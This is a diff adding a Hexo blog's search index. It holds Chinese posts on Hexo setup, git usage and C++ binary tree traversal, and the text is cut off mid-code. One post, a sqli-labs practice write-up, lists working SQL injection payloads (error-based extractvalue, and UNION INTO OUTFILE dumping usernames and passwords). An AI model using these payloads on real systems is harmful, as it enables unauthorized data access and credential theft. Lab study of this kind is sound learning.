@@ -1,0 +1,183 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>hexo多设备操作</title>
+    <url>/2021/12/04/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/</url>
+    <content><![CDATA[<p>在终于解决掉hexo图片路径的问题后,再次着手解决hexo多设备更新文章的问题</p>
+<p>首先在新设备上面安装Node.js和Git</p>
+<p>接着在项目中新建一个分支,或者将main分支改名为source分支并设置为默认分支</p>
+<p><img src="/images/hexo%E5%A4%9A%E8%AE%BE%E5%A4%87%E6%93%8D%E4%BD%9C/image-20211204031522619.png" alt="image-20211204031522619"></p>
+<p>确保该分支中文件为空</p>
+<p>新建一个hexo文件夹,在该文件夹内打开git bash,生成SSH公钥添加到Github</p>
+<p><code>git config --global user.name &quot;yourname&quot;</code></p>
+<p><code>git config --global user.email &quot;youremail&quot;</code></p>
+<p>可以用这两条命令检查有没有输对</p>
+<p><code>git config user.name</code></p>
+<p><code>git config user.email</code></p>
+<p>确保正确后</p>
+<p>输入<code>ssh-keygen -t rsa -C &quot;youremail&quot;</code></p>
+<p>会提示已经生成SSH秘钥,打开提示的文件夹,打开id_rsa.pub(公钥),复制内容在<code>头像-&gt;setting-&gt;SSH and GPG keys</code>下点击<code>New SSH key</code>,将复制的公钥粘贴进去,即完成了SSH公钥的添加</p>
+<p>在父目录打开git bash</p>
+<p><code>git clone git@github.com:yourname/yourname.github.io.git hexo</code> </p>
+<p>就会拉取source的文件到hexo文件夹下,cd hexo目录,删除所有除.git以外的文件</p>
+<p>接着将原来设备中的Hexo目录下的所有文件复制新建的hexo目录</p>
+<p>接着安装hexo </p>
+<p><code>npm install -g hexo cli</code></p>
+<p>安装一些依赖,不知道哪些有用,反正都装上吧</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">npm install hexo-generator-index --save</span><br><span class="line">npm install hexo-generator-archive --save</span><br><span class="line">npm install hexo-generator-category --save</span><br><span class="line">npm install hexo-generator-tag --save</span><br><span class="line">npm install hexo-server --save</span><br><span class="line">npm install hexo-deployer-git --save</span><br><span class="line">npm install hexo-deployer-heroku --save</span><br><span class="line">npm install hexo-deployer-rsync --save</span><br><span class="line">npm install hexo-deployer-openshift --save</span><br><span class="line">npm install hexo-renderer-marked@0.2 --save</span><br><span class="line">npm install hexo-renderer-stylus@0.2 --save</span><br><span class="line">npm install hexo-generator-feed@1 --save</span><br><span class="line">npm install hexo-generator-sitemap@1 --save</span><br><span class="line">npm install hexo-generator-search --save</span><br><span class="line">npm install hexo-generator-searchdb --save</span><br></pre></td></tr></table></figure>
+
+<p>接下来在有.git文件夹的目录下打开git bash</p>
+<p>开始准备push文件,提交前将.gitignore文件中的node_modules依赖库删掉,把它也传上去</p>
+<p><code>git init</code></p>
+<p>将当前目录下的文件放到暂存区(上膛)</p>
+<p><code>git add .</code></p>
+<p>可以用<code>git status</code>查看当前文件状态</p>
+<p>接着用<code>git commit -m &quot;本次提交的描述信息&quot;</code>提交描述信息</p>
+<p>因为之前已经拉取过,所以这句可以省略<code>git remote add origin &quot;远程仓库地址&quot;</code></p>
+<p><code>git push origin source</code>这样就成功将文件push到了source目录上面</p>
+<p>提交时考虑以下注意将themes目录以内中的主题的.git目录删除（如果有），因为一个git仓库中不能包含另一个git仓库，否则提交主题文件夹会失败</p>
+<p>提交成功之后,source分支就是保存博客的部署文件,让自己更新维护,master保存博客的静态页面,提供访问</p>
+<p>,新电脑只需要拉取source分支并安装需要的软件就能写博客了</p>
+<p>需要注意的点是,每当需要切换设备更新博客时候,一定要先将原设备中source分支下的内容push到github上,再由新设备拉取才能撰写博客push到master分支</p>
+<p>如果不嫌麻烦的话,每次写完文章</p>
+<p>git bash 五连击</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;new page&quot;</span></span><br><span class="line">git push origin <span class="built_in">source</span></span><br></pre></td></tr></table></figure>
+
+<p>换设备之后只需要在hexo目录下git pull即可写文章了</p>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>github</tag>
+        <tag>hexo</tag>
+        <tag>github公钥设置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo上传图片</title>
+    <url>/2021/12/02/pic-hexo/</url>
+    <content><![CDATA[<p>参考文章:</p>
+<p><a href="https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/">https://yinyoupoet.github.io/2019/09/03/hexo%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%8F%92%E5%85%A5%E5%9B%BE%E7%89%87/</a></p>
+<p>所有的博客文件保存在_post目录下</p>
+<p>在source下新建一个images文件夹</p>
+<p>打开Typora的 文件-&gt;偏好设置</p>
+<p><img src="/images/pic-hexo/image-20211203001406102.png"></p>
+<p>这样该文章中的图片都会保存在/source/images/文章名/图片名称</p>
+<p>现在的相对路径是基于当前md文件的,在服务器上可没有md文件,需要再typora中进一步设置</p>
+<p>在typora菜单栏点击 格式-&gt;图像-&gt;设置图片根目录，将hexo/source作为其根目录。</p>
+<p>会在md文件中会自动添加这一段</p>
+<p><img src="/images/pic-hexo/image-20211202174427901.png"></p>
+<p>然后在每次写文章时加上上面这句话,就能保证根目录正确了</p>
+]]></content>
+      <categories>
+        <category>hexo</category>
+      </categories>
+      <tags>
+        <tag>hexo上传图片</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>mypage1</title>
+    <url>/2021/12/02/mypage1/</url>
+    <content><![CDATA[<p>1111111</p>
+]]></content>
+      <categories>
+        <category>php</category>
+      </categories>
+      <tags>
+        <tag>111</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>sqli-labs</title>
+    <url>/2021/12/02/sqli-labs/</url>
+    <content><![CDATA[<h5 id="less3-less4"><a href="#less3-less4" class="headerlink" title="less3 less4"></a>less3 less4</h5><p>less3   less4</p>
+<p>less4(只需要将less3中的单引号换成双引号即可),同时less4也可通过报错注入</p>
+<p>通过单引号报错信息</p>
+<p>推测可能在接收参数后添加了( )包裹了id参数</p>
+<p><img src="/images/sqli-labs/Image.png"></p>
+<p><img src="/images/sqli-labs/Image%20%5B1%5D.png"></p>
+<p>通过构造闭合即可</p>
+<p>id=1’)%23</p>
+<p>接下来用union联合注入即可</p>
+<p>less4报错注入:通过检测,发现用双引号和括号对id进行了包裹,测试出的可用语句为id=1”) and 1=1%23</p>
+<p>根据报错注入公式,开始操作</p>
+<p>库名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select database())))%23</span><br></pre></td></tr></table></figure>
+
+<p>表名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)))%23</span><br></pre></td></tr></table></figure>
+
+<p>列名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)and extractvalue(1,concat(&#x27;~&#x27;,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)))%23</span><br></pre></td></tr></table></figure>
+
+<p>利用right和left函数相互配合爆出字段名s</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span>&quot;)and%20extractvalue(1,concat(%27~%27,(right((select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27),20))))%23</span><br></pre></td></tr></table></figure>
+
+<p>如法炮制,爆数据即可</p>
+<h5 id="less-7"><a href="#less-7" class="headerlink" title="less 7"></a>less 7</h5><p>本题经过尝试得到后台为((‘ ‘))包裹参数,可以通过页面显示,变化来进行盲注但是根据本题标题,提示使用outfile函数来进行注入<br>1.要使用outfile首先要知道绝对路径</p>
+<p>通过之前的less进行查询</p>
+<p>@@basedir是mysql安装路径</p>
+<p>@@datadir是数据库路径</p>
+<p><img src="/images/sqli-labs/1.png"></p>
+<p>2.读写权限测试mysql快速查看读写权限</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%secure%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sqli-labs/2.png"></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) and (select count(*) from mysql.user)&gt;0%23</span></span><br></pre></td></tr></table></figure>
+
+<p>如果返回正常,则说明有读写权限</p>
+<p><img src="/images/sqli-labs/3.png"></p>
+<p>其次在linux中还需要mysql用户对目录有w权限才能写入</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span>))<span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,table_name<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.tables<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_schema<span class="operator">%</span><span class="number">20</span><span class="operator">=</span><span class="operator">%</span><span class="number">27</span>security<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">into</span><span class="operator">%</span><span class="number">20</span>outfile<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span><span class="operator">/</span>www<span class="operator">/</span>wwwroot<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span><span class="number">2.</span>txt<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>通过上述语句查询表名,写入到2.txt</p>
+<p><img src="/images/sqli-labs/4.png"></p>
+<p>貌似文件只能新建,不能重复写入<br>查询列名</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span>))<span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,<span class="number">2</span>,column_name<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>information_schema.columns<span class="operator">%</span><span class="number">20</span><span class="keyword">where</span><span class="operator">%</span><span class="number">20</span>table_name<span class="operator">%</span><span class="number">20</span><span class="operator">=</span><span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span>users<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">20</span><span class="keyword">into</span><span class="operator">%</span><span class="number">20</span>outfile<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span><span class="operator">/</span>www<span class="operator">/</span>wwwroot<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span><span class="number">3.</span>txt<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>查询数据</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="operator">%</span><span class="number">27</span>))<span class="operator">%</span><span class="number">20</span><span class="keyword">union</span><span class="operator">%</span><span class="number">20</span><span class="keyword">select</span><span class="operator">%</span><span class="number">201</span>,username,password<span class="operator">%</span><span class="number">20</span><span class="keyword">from</span><span class="operator">%</span><span class="number">20</span>security.users<span class="operator">%</span><span class="number">20</span><span class="keyword">into</span><span class="operator">%</span><span class="number">20</span>outfile<span class="operator">%</span><span class="number">20</span><span class="operator">%</span><span class="number">27</span><span class="operator">/</span>www<span class="operator">/</span>wwwroot<span class="operator">/</span>sqli<span class="operator">-</span>labs<span class="operator">/</span>Less<span class="number">-7</span><span class="operator">/</span><span class="number">4.</span>txt<span class="operator">%</span><span class="number">27</span><span class="operator">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>sqli</category>
+      </categories>
+      <tags>
+        <tag>sqli-labs</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>git新建仓库</title>
+    <url>/2021/12/04/git%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/</url>
+    <content><![CDATA[<p>git新建仓库上传代码</p>
+<img src="/images/git%E6%96%B0%E5%BB%BA%E4%BB%93%E5%BA%93/image-20211204165449892.png" alt="image-20211204165449892" style="zoom: 67%;" />
+
+<p>首先create a new repository新建一个仓库,接下来找到本地要上传代码的文件夹</p>
+<p>在该文件夹下打开git bash</p>
+<p>输入下列命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global user.name &quot;用户名&quot;</span><br><span class="line">git config --global user.email &quot;邮箱&quot;</span><br><span class="line">git init  会生成.git文件夹</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;first commit&quot;</span><br><span class="line">git branch -M master</span><br><span class="line">//使用ssh之前要先配置公钥</span><br><span class="line">git remote add origin git@github.com:用户名/仓库名.git</span><br><span class="line">git push -u origin main</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>git</category>
+      </categories>
+      <tags>
+        <tag>git</tag>
+        <tag>github</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>二叉树遍历</title>
+    <url>/2021/12/04/%E4%BA%8C%E5%8F%89%E6%A0%91%E9%81%8D%E5%8E%86/</url>
+    <content><![CDATA[<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_INIT_SIZE 100<span class="comment">//存储空间初始分配量</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACKINCREMENT 10<span class="comment">//存储空间分配增量</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span> &#123;</span></span><br><span class="line">	<span class="keyword">char</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">BiTNode</span>* <span class="title">lchild</span>, * <span class="title">rchild</span>;</span></span><br><span class="line">&#125;BiTNode,* BiTree;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	BiTNode* treeNode;</span><br><span class="line">	Node* next;</span><br><span class="line">&#125;Node;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">LinkQueue</span> &#123;</span></span><br><span class="line">	Node* front;</span><br><span class="line">	Node* rear;</span><br><span class="line"></span><br><span class="line">&#125;LinkQueue;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	BiTNode* top;</span><br><span class="line">	BiTNode* base;</span><br><span class="line">	<span class="keyword">int</span> size;</span><br><span class="line"></span><br><span class="line">&#125;stack;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createBiTree</span><span class="params">(BiTree&amp; t)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preOrderTraverse</span><span class="params">(BiTree t)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inOrderTraverse1</span><span class="params">(BiTree t)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postOrderTraverse</span><span class="params">(BiTree t)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getDeep</span><span class="params">(BiTree t)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">initQueue</span><span class="params">(LinkQueue&amp; Q)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">enQueue</span><span class="params">(LinkQueue&amp; Q, BiTNode treeNode)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deQueue</span><span class="params">(LinkQueue&amp; Q)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">floorTraverse</span><span class="params">(LinkQueue&amp; Q, BiTree&amp; t)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inOrderTraverse2</span><span class="params">(stack s, BiTree&amp; t)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initStack</span><span class="params">(stack&amp; s)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isEmpty</span><span class="params">(stack&amp; s)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(stack&amp; s, BiTNode treeNode)</span></span>;</span><br><span class="line"><span class="function">BiTNode <span class="title">pop</span><span class="params">(stack&amp; s)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	BiTree t;</span><br><span class="line">	stack s;</span><br><span class="line">	<span class="built_in">initStack</span>(s);</span><br><span class="line">	LinkQueue Q;</span><br><span class="line">	<span class="built_in">initQueue</span>(Q);</span><br><span class="line">	<span class="built_in">createBiTree</span>(t);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二叉树创建完成&quot;</span> &lt;&lt; endl&lt;&lt;endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;先序遍历&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">preOrderTraverse</span>(t);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;递归中序遍历&quot;</span> &lt;&lt;endl;</span><br><span class="line">	<span class="built_in">inOrderTraverse1</span>(t);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;非递归中序遍历&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">inOrderTraverse2</span>(s, t);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;后序遍历&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">postOrderTraverse</span>(t);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;层序遍历&quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">floorTraverse</span>(Q, t);</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;二叉树的深度为&quot;</span> &lt;&lt; <span class="built_in">getDeep</span>(t) &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">createBiTree</span><span class="params">(BiTree&amp; t)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">char</span> c;</span><br><span class="line">	cin &gt;&gt; c;</span><br><span class="line">	<span class="keyword">if</span> (c == <span class="string">&#x27;$&#x27;</span>)</span><br><span class="line">		<span class="comment">//利用给先序遍历序列添加空节点保证建立二叉树的唯一性</span></span><br><span class="line">		t = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> (!(t = (BiTNode*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(BiTNode)))) &#123;</span><br><span class="line">			<span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//申请该节点的内存空间</span></span><br><span class="line">		<span class="comment">//按照先序序列创建二叉树</span></span><br><span class="line">		t-&gt;data = c;</span><br><span class="line">		<span class="built_in">createBiTree</span>(t-&gt;lchild);</span><br><span class="line">		<span class="built_in">createBiTree</span>(t-&gt;rchild);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//先序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preOrderTraverse</span><span class="params">(BiTree t)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (t) &#123;</span><br><span class="line">		cout &lt;&lt; t-&gt;data &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class="line">		<span class="built_in">preOrderTraverse</span>(t-&gt;lchild);</span><br><span class="line">		<span class="built_in">preOrderTraverse</span>(t-&gt;rchild);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//中序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inOrderTraverse1</span><span class="params">(BiTree t)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (t) &#123;</span><br><span class="line">		<span class="built_in">inOrderTraverse1</span>(t-&gt;lchild);</span><br><span class="line">		cout &lt;&lt; t-&gt;data &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class="line">		<span class="built_in">inOrderTraverse1</span>(t-&gt;rchild);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//后序遍历</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">postOrderTraverse</span><span class="params">(BiTree t)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (t) &#123;</span><br><span class="line">		<span class="built_in">postOrderTraverse</span>(t-&gt;lchild);</span><br><span class="line">		<span class="built_in">postOrderTraverse</span>(t-&gt;rchild);</span><br><span class="line">		cout &lt;&lt; t-&gt;data &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">getDeep</span><span class="params">(BiTree t)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (t == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//变成比较两个子树的深度问题,递归分解问题,最下面的时候返回1</span></span><br><span class="line">	<span class="keyword">int</span> a = <span class="built_in">getDeep</span>(t-&gt;lchild);</span><br><span class="line">	<span class="keyword">int</span> b = <span class="built_in">getDeep</span>(t-&gt;rchild);</span><br><span class="line">	<span class="keyword">return</span> (a &gt; b) ? (a + <span class="number">1</span>) : (b + <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">initQueue</span><span class="params">(LinkQueue&amp; Q)</span> </span>&#123;</span><br><span class="line">	Q.front = Q.rear = <span class="keyword">new</span> Node;</span><br><span class="line">	<span class="comment">//这个链队列是具有头结点的链队列,头结点不存数据</span></span><br><span class="line">	<span class="keyword">if</span> (!Q.front) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">	&#125;</span><br><span class="line">	Q.front-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">enQueue</span><span class="params">(LinkQueue&amp; Q, BiTNode *treeNode)</span> </span>&#123;</span><br><span class="line">	Node* p = (Node*)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(Node));</span><br><span class="line">	<span class="comment">//如果内存申请失败</span></span><br><span class="line">	<span class="keyword">if</span> (!p) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//让p节点中的treeNode指向对应的树节点</span></span><br><span class="line">	p-&gt;treeNode =treeNode;</span><br><span class="line">	p-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//连接链表</span></span><br><span class="line">	Q.rear-&gt;next = p;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//头结点的data域为空,尾结点data域非空</span></span><br><span class="line">	Q.rear = p;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deQueue</span><span class="params">(LinkQueue&amp; Q)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (Q.front &amp;&amp; Q.front != Q.rear) &#123;</span><br><span class="line">		<span class="comment">//新建一个temp指针p</span></span><br><span class="line">		Node* p = Q.front-&gt;next;</span><br><span class="line"></span><br><span class="line">		Q.front-&gt;next = p-&gt;next;</span><br><span class="line">		<span class="comment">//判断出队的是不是最后一个节点</span></span><br><span class="line">		<span class="comment">//如果不加这个判断free(p后),Q.rear-&gt;next会变为野指针</span></span><br><span class="line">		<span class="keyword">if</span> (p == Q.rear) &#123;</span><br><span class="line">			Q.rear = Q.front;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">free</span>(p);</span><br><span class="line">	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">floorTraverse</span><span class="params">(LinkQueue&amp; Q, BiTree&amp; t)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (t != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">enQueue</span>(Q, t);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (Q.front != Q.rear) &#123;</span><br><span class="line">		cout &lt;&lt; Q.front-&gt;next-&gt;treeNode-&gt;data &lt;&lt;<span class="string">&#x27; &#x27;</span> &lt;&lt; flush;</span><br><span class="line">		<span class="keyword">if</span> (Q.front-&gt;next-&gt;treeNode-&gt;lchild != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">enQueue</span>(Q, Q.front-&gt;next-&gt;treeNode-&gt;lchild);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (Q.front-&gt;next-&gt;treeNode-&gt;rchild != <span class="literal">NULL</span>) &#123;</span><br><span class="line">			<span class="built_in">enQueue</span>(Q, Q.front-&gt;next-&gt;treeNode-&gt;rchild);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">deQueue</span>(Q);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">inOrderTraverse2</span><span class="params">(stack s,BiTree&amp; t)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	BiTNode* p = t;</span><br><span class="line">	<span class="keyword">while</span>(p || !<span class="built_in">isEmpty</span>(s)) &#123;</span><br><span class="line">		<span class="keyword">if</span> (p) &#123;</span><br><span class="line">			<span class="built_in">push</span>(s, *p);</span><br><span class="line">			p = p-&gt;lchild;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			BiTNode e = <span class="built_in">pop</span>(s);</span><br><span class="line">			cout &lt;&lt; e.data &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; flush;</span><br><span class="line">			p = e.rchild;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//栈相关函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">initStack</span><span class="params">(stack&amp; s)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//申请内存空间</span></span><br><span class="line">	s.base = (BiTNode*)<span class="built_in">malloc</span>(STACK_INIT_SIZE * <span class="built_in"><span class="keyword">sizeof</span></span>(BiTNode));</span><br><span class="line">	<span class="keyword">if</span> (!s.base) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(OVERFLOW);</span><br><span class="line">	&#125;</span><br><span class="line">	s.top = s.base;</span><br><span class="line">	s.size = STACK_INIT_SIZE;</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isEmpty</span><span class="params">(stack&amp; s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s.base == s.top)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(stack&amp; s, BiTNode treeNode)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s.top - s.base &gt;= s.size) &#123;</span><br><span class="line">		s.base = (BiTNode*)<span class="built_in">realloc</span>(s.base, (s.size + STACKINCREMENT) * <span class="built_in"><span class="keyword">sizeof</span></span>(BiTNode));</span><br><span class="line">		<span 